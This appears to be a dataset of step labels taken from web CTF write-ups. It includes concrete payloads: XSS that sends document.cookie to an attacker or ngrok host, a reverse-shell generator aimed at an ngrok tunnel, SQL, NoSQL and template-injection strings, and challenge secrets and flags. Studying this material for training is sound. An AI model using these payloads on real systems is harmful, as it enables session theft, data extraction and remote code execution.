    "Briefly analyze the encoding function to get the basic idea for decoding messages.",
    "Prevent Content Security Policy Bypassing.",
    "The Web server handles only GET and POST requests with files",
    "Notice that the value of FLAG_AUTH is starred out",
    "Decoded the base64 encoded flag from the cookies",
    "Leaked secret key '19eb794c831f30f099a31b1c095a17d6' from 'config.py'",
    "Examined the 'login.js' file",
    "Inject the output into the exploit page's `style` element",
    "Understand that the password was split into various parts",
    "Sent a request to the API endpoint",
    "Leverage 'lower' filter to bypass 'class' string.",
    "Execute the SQL injection payload created in the previous step.",
    "Read and store the content of the merged PDF file.",
    "Consider size restrictions for choosing two small-sized PDFs.",
    "Recognize correct rearrangement as 'sRPd45w_0'.",
    "Successfully extract a password from the database",
    "Use the /find endpoint.",
    "Open Python.",
    "Find out that the website isn't protected by CSRF tokens but employs SameSite=Lax cookies.",
    "Identify element and class names within the code.",
    "Capture the requests received by the server logs, thereby obtaining the admin's cookie.",
    "Sign the JWT with 'dawgCTF?heckin#bamboozle' secret",
    "Retrieve the flag stored in the intercepted cookie.",
    "Determine that integer values exceeding '9223372036854775807' will be converted into floating numbers.",
    "Create a LibreOffice word document with the name 'poc.odt'.",
    "Identify the flag exposed within 'app.py'",
    "Use the command 'python nodejsshell.py 2.tcp.ngrok.io 13755' to generate a reverse shell payload for the ngrok tunnel.",
    "Use 'chmod u+x s3scanner.py'",
    "Identified missing file escape for characters on the filename.",
    "Identify the final flag from the assembled digits.",
    "Recognize image upload functionality",
    "Create the final URL.",
    "Dump all tables and columns",
    "The second request was treated as a separate request by HAProxy.",
    "Notice the recursive nature of the filtering.",
    "Attempted to access the admin console ('/login.php').",
    "Receive a message indicating the site is not served on this interface.",
    "Try to load a webpage associated with the 'admin' user.",
    "Note that mode=filter means any reflected XSS will be filtered and not executed.",
    "Separate WebSocket packets into ones that are related to sent messages (particularly user input).",
    "Exploit the vulnerability to enable Request Smuggling.",
    "Identify that the restrictions include the localhost (127.0.0.1).",
    "Visited the URL provided in the problem statement.",
    "Understood the goal to read the 'flag.txt' file that requires root access",
    "Design the payload to read the desired file.",
    "Accessed the robots.txt file of the website",
    "The value for the key-value pair is the payload.",
    "Learned that our submitted HTML was the only content present on the page.",
    "Utilize 'first' to get the first item of a list.",
    "Extract all the contents of the Git repository from the website.",
    "Noticed the presence of the '$query' attribute within 'SQL' class.",
    "Infer that fetching passwords is possible by comparing password characters to the alphabet in the payload.",
    "Recognize the possibility of embedding any code into HTML using GET parameter.",
    "Acknowledged this version is vulnerable to a recent path traversal zero-day.",
    "Identify that the 'login_session_token' is used when making a query to 'mfa_service.php'.",
    "Conducted a remote file read operation.",
    "Write a Python script.",
    "fromCharCode() is utilized to avoid escaping quotes",
    "Find the code in 'view.php'.",
    "Set the payload parameter at userID.",
    "Notice absence of arguments in 'require()' call.",
    "Successfully exploit the path traversal vulnerability using a triple URL-encoded payload.",
    "Add the encoded 'userdata' as a request parameter for the mfa service.",
    "Verify the formatting of the command.",
    "Analyze the source codes provided.",
    "Inject the payload ' or sleep(2) and 1=1#.",
    "Identify LFI vulnerability.",
    "Took note of the different server requests that were sent as a result.",
    "Identify and store the authenticated session cookie for 'admin' from the response.",
    "Received the response",
    "Found database config info in config.py.",
    "Create a separate PDF page list for the first input PDF.",
    "Modify the number of pages stored in 'app.xml'",
    "Exploit the vulnerability.",
    "Identify the publicly accessible functionality '/dogooo/deets/<postid>'.",
    "The code gives the flag upon meeting the condition",
    "Identify the app as a TypeScript app.",
    "Recognized a restrictive CSP.",
    "Reviewed JavaScript 'index.js'.",
    "View the page with the flag, 'rtcp{rtcp-*is-s/ort-of-se1fh0st3d}'.",
    "Capture the payload of the response, identifying the included JWT token.",
    "Construct a payload.",
    "Analyze the source code",
    "Found a comment detailing an admin console at http://172.16.2.155.",
    "Understand the relationship between the endpoints and the user's ID cookie in the Notes map.",
    "Send a GET request to the URL.",
    "Determine the 'value' attribute is at the end of the Java serialized object",
    "Analysed the server's CSP policy.",
    "Include the '/gallery?galleryUrl=' query parameter.",
    "The HTML encoding process of individual characters is done in the loop function",
    "Reveal all the source code.",
    "Deduce that the language might be Swedish",
    "Received the admin's hash on the exploit server",
    "Visited the vulnerability database at https://www.exploit-db.com/exploits/50383",
    "Realize the execution of PHP code when reading a file through LFI",
    "Identify verifyPassword() within the verify() function.",
    "Manipulated the 'profile_img' attribute in the PHP object",
    "Ensure the request is made from the localhost.",
    "Make the first GET request: 'GET https://yeunote.ctf.yeuchimse.com/note/twitter/3'.",
    "Obtain the fake flag and the admin's PHP Session ID",
    "Discovered Angular uses a Host header - 'PROTOCOL + HOST + / PATH' while performing HTTP requests.",
    "Received a successful response from the webserver.",
    "Confirm that Waitress sees both received requests.",
    "Start a listening host with 'nc -lkv 1337'",
    "Launch remote commands using the Python script.",
    "Replace any 'secret' tags with the word 'Protected'.",
    "Constructed a payload to test the exploit.",
    "Discover a potential for XSS injection.",
    "Created an XPATH injection payload.",
    "Identify that eval() function is vulnerable.",
    "Alter the value of the 'not_admin' cookie",
    "Use the 'requests' library to send HTTP GET requests.",
    "Leverage 'lower' filter to bypass 'getitem' string.",
    "Identify two distinct changes to the 'index.php' file.",
    "Check if the IP is a private IP using the ipaddress library.",
    "We use a common XSS code: '<script>document.location='http://<ATTACKER_SERVER>?c='+document.cookie;</script>' to redirect to our webpage by changing the 'document.location' and setting the 'c' argument to 'document.cookie', which contains the current page's cookies.",
    "Execute the exploit script to generate the payload.",
    "Redirected the attacker server to the target URL after 19 redirects.",
    "Test the SQL injections '/api/call_api.php?api=10.0.42.200/?search=admin_richard_lauren'/**/OR/**/'1'='2'.",
    "Attempts to open a reverse shell modified the PHP file.",
    "Find the `login` cookie with base64 content",
    "Use the Python script to discover the token",
    "Build the token using NodeJS",
    "Impersonated Maria.",
    "Enter blank input enclosed in two apostrophes in both the username and password fields.",
    "Open a WebSocket to 'ws://localhost:7070/quote'.",
    "Used `1';EXECUTE IMMEDIATE CONCAT('SEL', 'ECT * FROM words');` to retrieve data from the 'words' table.",
    "Compose an SMS message",
    "Understood that `$var8` represents the pointer to the newly allocated memory for the payload.",
    "Connect to URL",
    "Discovered that any timing attack with 'performance.now()' would have worked.",
    "Discover that the script can be bypassed by using a proxy tool for request interception and repetition.",
    "Craft an SQL injection payload.",
    "Identify PHP object injection vulnerability through unserialize() function.",
    "Find the flag file in the current working directory.",
    "Identify that the solution involves predicting the random numbers generated.",
    "Change the hashed value to correspond to different usernames.",
    "Conducted fuzzing",
    "Used PHP filters.",
    "Identify a hint suggesting a length extension attack",
    "Exploit: apply negative price when selling a flag",
    "Find a commented item in the HTML source of the page.",
    "View '/etc/passwd' using LFI vulnerability.",
    "Injected the crafted payload into a request in either the bottom text",
    "Navigate the HTTP request smuggling attack",
    "Sign the token using the public key.",
    "Log in using user credentials",
    "Learn that backticks can be used instead of parentheses in JavaScript",
    "Control the 'window.name' variable with the exploit script.",
    "If the text is found, the guess was incorrect.",
    "Decoded the base64 encoded result.",
    "Create a token",
    "POST the page",
    "Server code for /api/filter endpoint returns the hash of the user's token in the response",
    "Visited the website and viewed the login page",
    "Used `Access-Control-Allow-Origin: *` header.",
    "Insert an image reference with an 'onerror' attribute.",
    "Explore the file system to find the flag 'MetaCTF{wh4t??lfi_1s_ev0lv1ng??}'.",
    "Retrieve the flag `STC{l0cal_f1l3_1nclus10n_328d47c2ac5b2389ddc47e5500d30e04}`.",
    "The third payload ends up triggering an alert.",
    "Observe that the extracted flag is 'cybrics{imagesaresocoolicandrawonthem}'.",
    "Discover the login credentials in the logs",
    "Test basic payloads.",
    "Use the 'mutool info -X' command to verify 'collision2.pdf'.",
    "Source code uses a markdown library to convert markdown into HTML.",
    "Execute the payload to return all the subclasses",
    "Triggered a JSONP response from the YouTube API.",
    "Make the admin visit the modified 'Link to profile'",
    "Goal: Perform an XSS attack and make a URL to trigger alert(1) for getting the flag.",
    "Retrieved user information.",
    "Received a custom error as a response to the SQL injection.",
    "Add a JSON object '{\"foo\":\"bar\"}' to the body.",
    "Inserted a series of directory traversal characters (/%2e%2e/%2e%2e) in the request to access server root directories",
    "Collect the flag from the server's response.",
    "Gather information about the server-side tools used for document conversions.",
    "Check the IP address against the whitelist.",
    "Notice the use of 'ElementInclude.include(root)' in the code.",
    "Found out that 'pkg' is an object containing the 'package.json' fields.",
    "Verified that the 'index.php' file contains the flag.",
    "Identify a specific replace function within the source code.",
    "Set IDSEED with 'id\u306e\u7a2e'",
    "Replace the initial regex in the Python code.",
    "Understand that \u2018SCRIPT_NAME\u2019 can be set through an HTTP header, which can bypass the '/admin' denial in Nginx configuration",
    "Confirm remote command execution vulnerability.",
    "Identify 'mec' as relating to a WordPress Plugin.",
    "Begin using the payload: {\"username\": \"admin\", \"password\": {\"$gt\": \"a\"}}",
    "Reveal the entire password",
    "Used a tool like Burp Suite Intruder for the scan.",
    "Manipulated 'app.post('/upload' to process with invalid 'req.files[req.query.formid]'.",
    "Create a new user as the default user role is immutable.",
    "The script reads from '/mydank'",
    "Identify the flag hidden in the retrieved response: 'DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}'.",
    "Identify a potential redis injection flaw in the refresh_session() function.",
    "Replace one of the RGB values in the 'background' parameter.",
    "Modify the value of the admin cookie.",
    "Observe the HTTP 401 UNAUTHORIZED status in the response",
    "Read the 'pdf2.bin' file.",
    "Utilize the custom wordlist to find more logs.",
    "Identified that a 'secret' token is added to cookies in the request to the backend server.",
    "Discovering a programming error where crypto.randomUUID (the function) is used as the secret, instead of calling it.",
    "Identified that the second column contains usernames.",
    "Use the manipulated cookies to gain access.",
    "Read HTML",
    "Rename duplicated file to indicate shell",
    "If a guess was successful, restart the loop to guess the next character.",
    "Change the hashed value in the session_id cookie to correspond to the username 'admin'.",
    "Tried to insert '%' wildcard to bypass check.",
    "Determine that the website is running on a MySQL database.",
    "Executed 'id' command.",
    "Search for the flag format",
    "Enclosed payload in double quotes for PHP.",
    "Gain admin access.",
    "Change User-Agent to 'Linux' using a curl command",
    "Executed the cURL command",
    "Noticed the output of 'List Storage' command runs 'df -h'.",
    "Receive and log the cookie transferred as a query parameter.",
    "Identify that the task is similar to the previous one.",
    "Intended to load the '/static/js/marked.min.js' files from a different URL to exploit the script tags being part of the original template.",
    "Determine that the certificate seems invalid.",
    "Include the parameter in the request.",
    "Perform a directory busting scan using gobuster",
    "Explore the source code files",
    "Discover the SQL Injection payload from the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,null,null,text,null,null/**/from/**/posts'",
    "Realized the susceptibility of SHA1 algorithm for PDFs.",
    "Reverse shell is obtained on the target system.",
    "Bypass the restriction caused by the referrer header.",
    "Understand that 'parse=\"xml\"' raises an error when used with non-XML content.",
    "Follow the redirection.",
    "Receive a message that this page is for authentication with an API located at port 4000.",
    "GET query parameters were added to the messages before verification.",
    "Analyze the functionality of the converted code snippet.",
    "Manage to access the admin's note.",
    "Received different responses from the '/two/' endpoint with 'CONNECT' HTTP verb.",
    "Analyzed the provided PHP code for the application's API request handling.",
    "See a page notifying about an incorrect login.",
    "Note that an array passed in 'file' GET parameter gets converted and concatenated into a string",
    "Inject the SQL Injection payload into the password field.",
    "Execute the developed script.",
    "Understand that STTF allows scrolling to a specific portion of the page using a text snippet in the URL.",
    "Include 'Content-Length:53' header in the request.",
    "Identify the goal of this CTF problem is to bypass WAF protection.",
    "Identified a potential SQL injection vulnerability.",
    "Check successful log-in messages to determine correct characters.",
    "Used the SQL injection to enumerate the columns of the flag table.",
    "Visit the website with the updated cookies.",
    "Extract the first flag from the decoded field.",
    "Select 'Inspect' or 'Inspect Element'",
    "Obtained the flag 'CTFSG{d0nT_toUcH_mY_c00k13s}'.",
    "Notice that to match the value of 'hash' and 'target', the 'hash' param cannot equal '10932435112'.",
    "Retrieve directory listing",
    "Perform the 'cat' command on '/home/user/flag.txt'.",
    "Plugged the password ('w0rdc0unt123') from '$password' variable to the cookie.",
    "Sent the POST request",
    "Use 'scandir' and 'file_get_contents' to browse through files in the '/etc' directory",
    "Locate the PHP script that compares the md5 hashes of 'i1' and 'i2'",
    "Identify the conditions for file retrieval",
    "Dump the database.",
    "Use /apisix/batch-requests endpoint.",
    "Discovered that the 'uri' is appended to the backend URL using Python's urllib.parse.urljoin.",
    "Send a GET request to /jwtlogin",
    "Understand that to obtain the flag, the secretid must match the length of the secrets array and the permissions must be set to 'admin'",
    "Constructed a base to perform SQL injection.",
    "Identify the text input for HTML notes",
    "Passed the input to the injection point at 'GET /legacy_invoice_system/*'.",
    "We need an actively running server to receive this request and log the cookie.",
    "Identify the end goal as getting access to /flag.",
    "Examined how the note taking app functions.",
    "Get information about the PHP configuration",
    "Adjusted the '$method' attribute in the serialized object.",
    "Identify that the formula points to another sheet's labeled 'Source'",
    "Download the '.env' file.",
    "Find the 'access_log' class in authentication.php",
    "Understood from the JSON response.",
    "Visit 'https://web0.ctfsecurinets.com/_profiler/open?file=/secret_ctf_location/env'.",
    "Find out that it has only user privileges.",
    "Guessed that 'application/x-www-form-urlencoded' parameter must be used.",
    "Sent this XSS payload through the data endpoint",
    "Run the server script with a new payload '?icecream={{application.settings[\"cookie_secret\"]}}'.",
    "Initiate brute force attack on the token.",
    "Analyzed the MySQL query builder in the search function.",
    "Realize that eval does not display the output",
    "Tried to access port 9006 directly but didn't get meaningful information.",
    "Use the custom command from 'phpggc' repo",
    "Observe successful execution of the command.",
    "Disguise the phar file as a JPEG image.",
    "Specify the '/admin' path as the target.",
    "Identify a redirection URL.",
    "Intercept a GET request to /jwtlogin",
    "Found some encoded payload",
    "Discover that the /find endpoint can be used for Response Header Injection.",
    "As opposed to executing normally (runs as `nobody` user).",
    "Find that SQLite treats large integers the same way it treats strings during concatenation.",
    "Performed repetitive actions of sending requests",
    "HTML rendering by pdfkit/wkhtmltopdf",
    "Recognize that STTF is a Chromium feature.",
    "Crafted a URL that appended an HTML header tag to the domain part of the email parameter, thereby exploiting the lax character restriction.",
    "Constructed a JavaScript payload to be run on the victim's browser.",
    "Fail to restore source code due to missing git objects.",
    "Sent the specially constructed requests to the server.",
    "Understand that the challenge involves a Same-Origin XSS attack",
    "Confirm the success of the attack by checking for a new follow request from admin.",
    "Set 'x' corresponding to the index of 'subprocess.Popen'.",
    "Find a web proxy application",
    "Set the 'Host' header manually to threeofhearts.ctf.net.",
    "Navigate to the '.github/workflows' directory",
    "Query the protection of the website by CSRF tokens.",
    "Extracted the page URL.",
    "Use the JWT secret to create a JWT with the admin role.",
    "Assume that the input fields are not properly sanitizing special characters.",
    "Removed 'foo.txt' from the 'ctf-bzr' directory.",
    "Use each character as the value for both 'pass' and the User-Agent header",
    "Realized the input was being reflected into an XSL document.",
    "Understood the requirement for a reflected XSS exploit",
    "Found out that despite such constraints, the SQLmap successfully retrieved the flag 'ASIS{6e73c9d277cc0776ede0cbd36eb93960d0b07884}'.",
    "Access flag",
    "Identify a specific end-point '/ping?id='.",
    "Create a WebSocket connection to the DevTools of the browser instance.",
    "Take note of suspect templates in the webpage's code, such as an 'update store description' template.",
    "Test different file extensions.",
    "Identified the condition that only PDF files containing 'ECHO' would be signed.",
    "Discover RCE vulnerability through pre-installed 'pearcmd.php'.",
    "Confirmed SQLite injection was possible by manipulating the 'moneys=' parameter and seeing the results in the green text.",
    "Identified the allowance of loading stylesheets from '*.jsapi.tech'.",
    "Wrote the cgi header with 'Content-type: text/html'.",
    "Look at the responses when searching for a note",
    "Understood the presence of a blacklist filter for '=' symbol",
    "Used python3 payload.py | nc localhost 8000 to see the second flag on the receiving server.",
    "App was composed of frontend and payment backend.",
    "The server misconstrues the public key as an HMAC private key due to the vulnerability.",
    "Identify the correct timestamp format.",
    "Encode the script into base64 to bypass the filtering.",
    "Continue the investigation by exploring the scope of the Template Injection vulnerability.",
    "Analyze the weak encryption.",
    "Noticed that the `name` is written to memory regardless of XSS check.",
    "Tried to understand how the website works.",
    "Discover the requirement of the 'otadmin' cookie",
    "Slept for half a second",
    "Run Dirb to scan for hidden directories or files",
    "Set the range of characters to loop through as '0123456789abcdef' (hexadecimal).",
    "Include the composed JSON body in the POST request.",
    "Deduce that it is MySQL.",
    "Understand the functionality",
    "Bot clicking our link gave us the flag.",
    "Sent the payload <img src=x onerror=this.src='<NGROK-LINK-HERE>/?'+document.cookie;>.",
    "Used 'php://filter' again.",
    "Locate the route '/adminNames' in the website source.",
    "Identified that the system might be susceptible to an XXE (XML External Entity) attack.",
    "Ensure the file is empty.",
    "Notice a 302 found page.",
    "Use the modified cookie",
    "Inspect the injected JavaScript code that is responsible for WebSocket communication.",
    "Discover potential directories or files",
    "Understand that the rendering is done via a custom host header",
    "Observe cookies being set at every stage of authentication.",
    "Established the coordinates of the point of interest",
    "Identify the functionality of the Python script",
    "Extracted the contents of the zip file",
    "If it is not, continue loop with next character",
    "Receive 403 Forbidden.",
    "Injected arbitrary HTML through HTML comments.",
    "Observe the extracted password is very long and alphanumeric",
    "Perform the action of extracting the flag.",
    "Download the PCAP file.",
    "Identified the '/flag' endpoint in the robots.txt file",
    "Use a similar approach to bypass '.' character for callback domain.",
    "Modified the `ApiMapper`.",
    "Find the flag, which is meant to be in a file in the '/etc' directory",
    "Understood the condition for adding DOMPurify-sanitized HTML into the child iframe.",
    "Entered 'view-source:https://no-right-click.hsc.tf/useless-file.css' in the browser's address bar.",
    "The site's subdomain matches the target domain.",
    "Craft a request",
    "Confirm that no error occurs.",
    "Included the 'Content-Length' header in the payload.",
    "Identify the Laravel version used in the challenge",
    "Identify the specific JavaScript file",
    "Discover the usage of XML envelopes via two JavaScript files when buttons are pressed.",
    "Review the given PHP code.",
    "Identify that input sanitization is only implemented on the front end via JavaScript.",
    "Set the script source to the data wanted to exfiltrate.",
    "The check is to see if the response text contains 'check'.",
    "Verify admin privilege.",
    "Analysed the `main.dart.js`.",
    "Find the input box",
    "Post the crafted message",
    "Discovered that the subdomain 'jsapi.tech' points to 'sohomdatta1.github.io'.",
    "Smuggle the GET request inside a POST request made to the Go microservice",
    "Used the script from https://github.com/PequalsNP-team/pequalsnp-team.github.io/blob/master/assets/search.py",
    "Study the commit history",
    "Craft the malicious query.",
    "Identify the usage of the Python Pillow library.",
    "Exfiltrate the output of executed commands.",
    "Extracted the jwt token from the response",
    "Received different responses from '/two/' endpoint with 'PUT' and 'CONNECT' HTTP verbs.",
    "Re-login",
    "Note that the server will retrieve a value of 'undefined' for secret['randomstr'] and will not attempt to verify the JWT because the algorithm is 'none'",
    "Decided to open the Network tab.",
    "Extract the admin cookie 'password'",
    "Open the file index.html.",
    "Understand the deserialization of the added cookie into an 'access_log' object",
    "Identify the existence of prototype pollution vulnerability in the `applyPatch()` function.",
    "Realize it is a misdirection towards '/useradmin'.",
    "Accessed '/q' endpoint.",
    "Include the SQL injection payload in the requests",
    "Begin to test this theory with 'handlebars', a tool which previously had a known vulnerability in processing templates.",
    "Identify the package fast-json-patch as vulnerable to Prototype Pollution.",
    "Devise the exploit.",
    "Receive a 302 response",
    "Understand regex filter on 'f' parameter.",
    "Use an Integrated Development Environment (IDE) for examination.",
    "Understand the need to 'steal' an admin cookie and gain admin access.",
    "Identify that the QR Code produced only contains the first character inserted.",
    "Retrieve the flag",
    "Analyze the source code.",
    "Click on the 'GET FLAG' button",
    "Realized the mutation could be simplified to create the exploit.",
    "Investigate Angular's source code.",
    "Send the generated webpage to the website.",
    "Try out all remaining expected values.",
    "Trigger the execution of the flag_dispenser command.",
    "Understand that '....//' can be used to bypass the replacement of '../'.",
    "Discovered a workaround to fix the loading behaviour.",
    "Enabled 'enable_experimental_features'.",
    "Create the new PHP exploit",
    "Attempt to follow admin.",
    "Parsed the challenge PHP source code.",
    "Received a Markdown Editor web application to host notes for a challenge",
    "Manipulated the IP address parameter in the SQL query.",
    "Encode the cookie-characters as response headers.",
    "Realized finally that both SQL statements are identical to 'SELECT username, password FROM users WHERE username='admin''",
    "Browsed through the blog.",
    "Escalate privileges",
    "Retrieve the corresponding IP address",
    "The server recognized the signature and provided the flag.",
    "Discover the 'schema.prism' file.",
    "Identify verifyMFA() within the verify() function.",
    "Create a for loop to iterate through the numbers from 1 to 20.",
    "Specify the 'news' category by adding '?cat=news' to the URL.",
    "Search or browse through the quiz section to find the flag.",
    "The 'flag' value updates with the successful character.",
    "Injected two `reCAPTCHA` buttons.",
    "Open the URL with a browser",
    "Examine the /find endpoint.",
    "Decoded base64 strings to view the source code of 'wc.php'.",
    "Ran the server locally",
    "Identified task to bypass countermeasures.",
    "Extract the flag from the converted text.",
    "Attempt to display the flag within the response body",
    "Perform a bruteforce attack.",
    "Identify the URL 'ip.address/?lang=es.php' as a potential target for LFI.",
    "Get HTTP `403 Forbidden` response.",
    "Recognize the SQL injection vulnerability in the 'id' parameter",
    "Note that the page wasn't setting any X-XSS-Protection header.",
    "Pass a range of data values to test the properties of the number casting in the database.",
    "Crafted an HTML payload for exploiting this vulnerability",
    "Design the XML code to expose the flag file from the current working directory.",
    "Exploit the vulnerability to display file content",
    "Understand that RCE can be achieved by passing a serialized object into 'serialize.unserialize()'.",
    "Identified the presence of protected DIG records.",
    "Step 2: Validate and insert into the database.",
    "Analyze the website's HTML.",
    "Understand that the challenge is to bypass a script inside the iframe",
    "Execute a SQL query via URL manipulation",
    "Discovered that the PDF contains the flag.",
    "Aim to steal the admin's secrets through the POST request.",
    "Determine likelihood of hidden flag in /private.php.",
    "Inspect the format of request packets.",
    "Read the response from FD 4.",
    "Understand the behavior of the code.",
    "Download files from the target server.",
    "Modified the GET request.",
    "Identified the new flag value in the response",
    "Analyze the JWT",
    "Include JSON payload in the request body.",
    "Submit the URL.",
    "Identified vulnerability in /api/image endpoint",
    "Use 'pip install -r requirements.txt'",
    "Confirm that the observed behavior indicates a Blind SQL Injection vulnerability",
    "Identified the 'unserialize()' function",
    "Concluded from the SQLmap results that there are two databases available: 'ASISCTF' and 'information_schema'.",
    "Recognize the existence of '/set.php' page.",
    "Retrieve data from the response.",
    "Understand that the goal is to fetch all of the password's characters.",
    "Understood that the admin bot visits any URL provided.",
    "Conditions: Comment text contains a format string like '{rating}'.",
    "Recognized the `onPressed` event handler `api_post`.",
    "Identify the reason for the failure as JavaScript trying to parse parentheses",
    "Utilize the requests library in Python for communication.",
    "Identify the application as a WordPress site.",
    "Encode the flag.png file using Base64 encoding.",
    "Applied the retrieved signature to the second PDF.",
    "Identify the presence of a create table statement vulnerability.",
    "Requested an OTP at '/request_code'.",
    "Discovered that HTML injection is possible",
    "Enumerated the columns of the flag table.",
    "Fail to recognize the potential for using an SQL injection into the password field as an authentication bypass",
    "Download the file named configs.zip.",
    "Monitor the Network Tab responses.",
    "Inspect webpage response.",
    "Realized the previous solution may not have been intended.",
    "Access all accounts with the obtained credentials",
    "Conclude that '/pleb' and '/pleb.' work like domain Top Level Domains (TLDs).",
    "Understand the need to overcome file extension restrictions.",
    "Modify the available PoC to suit the given context.",
    "Used 'username=test' or 1 UNION SELECT *, null from flag-- -&password=test' or 1 UNION SELECT *, null from flag-- -' as the injection payload",
    "Recognize that altering the 'admin' value requires the JWT secret.",
    "Searched for additional SQL injection endpoints.",
    "Identify that the request was double proxied with Apache.",
    "Navigate to the user creation interface on the site.",
    "Investigate changes made in the 'Fix auth!!!' commit",
    "Learn about the older version of SQLAlchemy",
    "Understood the conditions for the 'doit' method being called, specifically if present in the '$method' attribute of the destructed object.",
    "Use the '|' operator in the created regex.",
    "Print the content of the final page.",
    "Reveal the flag",
    "Use jwt.io tool",
    "Decide to use the rot13-encoded version of a listed admin username.",
    "Receive the flag 'inctfi{IDK_WHY_I_EVEN_USED_REDIS_HERE!!!}'.",
    "Observe the HTTP response.",
    "Realized that `HEAD->name` can be controlled.",
    "Observe the result of the exploit leading to '/flag'.",
    "Note that the cached secret is only available for 2 seconds after logging in.",
    "Check if the XOR result is zero.",
    "Understand that the potential XSS injection is blocked by the Content-Security-Policy header.",
    "Extract the first character of the password",
    "Understand that TODO notes of users can be read by enumerating URLs in a certain format.",
    "Recognize that Werkzeug includes a debugging console at '/console' when debugging is enabled.",
    "Ran '/readflag' by passing it as an argument to the defined 'pwn' function.",
    "Perform a certificate search using crt.sh.",
    "Find the comment indicating the source code location.",
    "Craft a request with LF in chunk extension.",
    "Script iteratively reads the transmissions.",
    "Understand that the JWT token is essentially encoded JSON data.",
    "Inspect the cookies.",
    "Decide to exploit the RCE vulnerability.",
    "Attempt to bypass the double-check using the modified DNS entry.",
    "Managed to bypass the 'parse_url($remote, PHP_URL_HOST)' condition.",
    "Recognize the existence of a `$query` attribute in the `SQL` class utilized for creating a prepared statement.",
    "Split the data because it exceeded the length limit for the URL.",
    "Look for a JWT in the 'token' header of the responses.",
    "Identify the goal: Bypass a WAF (Web Application Firewall).",
    "Used the 'view XML' tab on the web interface.",
    "Manipulated the `statusCode` using the injected buttons.",
    "Identify the 'account' object",
    "Observe that the 'request.accessGranted' attribute becomes undefined in such cases.",
    "Opened the browser console.",
    "Check if guessed character is in password",
    "Identify the route as '/getFile?file=admins'.",
    "Identified manipulating capabilities of Apache2.",
    "Generate a tripcode for each possible IP",
    "Noted the server requests",
    "Check differences between the suspicious commit and its preceding commit.",
    "Established the potential presence of an SQL injection vulnerability when the result of the book with 'id=1' printed.",
    "Authenticated as admin and explored login.php",
    "Identify the cookie related to flavor",
    "Identify the usage of Python 3's f-Strings functionality in the 'login' method.",
    "Complete the challenge.",
    "Exploit SSRF vulnerability to gain access to NFS filesystem",
    "Construct a curl command to send the payload to the server.",
    "Observe that the username is reflected back into the username field.",
    "Enter the provided URL in the address bar.",
    "Access the browser's developer tools.",
    "Compose a JSON body with 'username': 'admin'.",
    "Add the RS256-to-HS256 exploit to the JWT.",
    "Bypass the access control implemented on ATS.",
    "Identify a function that validates the input of a UUID in 'functions.php'.",
    "Cannot modify anything in '/home/manhndd/.ssh/'",
    "Find admin cookie",
    "Observe the flag in the request header.",
    "Construct regex pattern.",
    "Access the front-end JavaScript source code.",
    "Follow the retrieved link",
    "Understand permission of pipe character '|'.",
    "Receive in response an 'image' encoded in base64.",
    "Test the character '%'",
    "Used GROUP_CONCAT function to concatenate all retrieved table names into a single string.",
    "Notice the requests being made to the API endpoint.",
    "Guess that the flag is 'FLAG{r0uter_p0rtals_are_ultimately_impenetrable_because_they_are_real_weird}'.",
    "Create a JavaScript script within the HTML page.",
    "Implemented a loop in the Python script.",
    "Inspect the front-end JavaScript source code.",
    "Identified the CTF flag",
    "Double decoded the user cookie",
    "Include Thymeleaf expression to fetch the value of 'FLAG' environment variable.",
    "Receive a page showing successful entry and the flag",
    "Tested rendering in the browser.",
    "Assess the functionality of the web page.",
    "Understood the layout and elements of the webpage.",
    "Recognize the tripcode as 'ueyUrcwA'",
    "Begin preparing an attack.",
    "Reveal mapping in the Apache configuration file.",
    "Directly access flag with 'flag_id=3' using HTTP POST /buy request",
    "Create 'collision1.pdf' with the predetermined prefix.",
    "Construct PHP payload.",
    "Replaced the current 'dirstate' file with the newly downloaded one.",
    "Ensure the payload exceeds 8kB.",
    "Fail due to the site removing <script> tags.",
    "Inspect the provided Nginx configuration for any vulnerabilities",
    "Inspected the HTML source code.",
    "No output was returned.",
    "Gain understanding of the game mechanics.",
    "Create a function `execute_command` in the Python script.",
    "Alter the JWT's payload to change the user type to admin.",
    "Understood that a shell needs to be spawned as root",
    "Identify a meta tag with the name attribute 'redpwnctf2020' in the HTML source code.",
    "Inspect the contents of the accessed page.",
    "Receive a list of pumps and their IDs.",
    "Utilize the '{rating[comments][0].__class__.__init__.__globals__}' format string.",
    "Note that 'warmup' GET parameter is strictly checked for.",
    "Realized the application was simulating a Brainf*ck decompiler.",
    "Get the uploaded HTML file link from the webpage.",
    "Concluded that the web application may interpret HTML content, thus implying a potential for Cross-site Scripting (XSS).",
    "Realize that this allows us to bypass the JavaScript's check.",
    "Note that the '|' operator allows for matching of either of two separate regular expressions.",
    "Analyzed the PHP code in the source.",
    "Create a file 'shell.txt'.",
    "Determined that the function is used in the index route",
    "Use this method to bruteforce the admin token one character at a time.",
    "Send GET requests with incrementing 'id' using the script.",
    "Discover the flag.",
    "Execute the crafted payload",
    "Recognize that RGB parameters can be manipulated in the uploaded image.",
    "Reviewed the XML return from the 'view XML' tab.",
    "Implemented a condition in the Python script.",
    "Analyze the provided Python server script.",
    "Used the command: nikto -h http://172.17.15.117:443/",
    "Confirmed that remote code execution (RCE) was necessary.",
    "Request the /fuel endpoint.",
    "Assign 'triton' as the rocket name in the POST request body.",
    "Encounter challenges while trying to navigate up directories.",
    "Examined the Content-Security-Policy (CSP) of the site.",
    "The payload was included in the request",
    "Observe the submission of comments as a two-step process.",
    "Access 'globals' objects using the format string.",
    "Use the custom host header to target your own host",
    "Identify that the vulnerability exists",
    "Acknowledge that the bypass involves embedding the iframe",
    "Open Python.",
    "Identify a web application vulnerability, specifically XS Leaks.",
    "Specify the port number.",
    "Identified a loophole in the 'search' feature.",
    "Realized a '<script>' payload wouldn't work due to Content Security Policy blocking arbitrary scripts without a randomly-generated nonce.",
    "Attempt to connect to the real server.",
    "The one-liner creates a malicious 'id' payload",
    "Access the URL `https://xmas.2020.chall.actf.co/post`",
    "Compare all characters in a possible range.",
    "Understand that the WebSockets library used is flask_sockets.",
    "Run a command to convert the base64 string to ASCII.",
    "Used the new AWS credentials to access DynamoDB",
    "Investigate the response to the input.",
    "Identify that the secret key is hardcoded in the JavaScript.",
    "Use a similar approach to bypass '\"' character for bash command.",
    "Recognize that the page allows you to upload a custom HTML page.",
    "Open 'content.xml' and modify its contents to include a payload that links to the '/flag' file.",
    "Access the site at :7777",
    "Ensured the voting process continues until more than 250 votes are cast in the same PHP session.",
    "Try different versions of the Twitter login page.",
    "Analyze HTML",
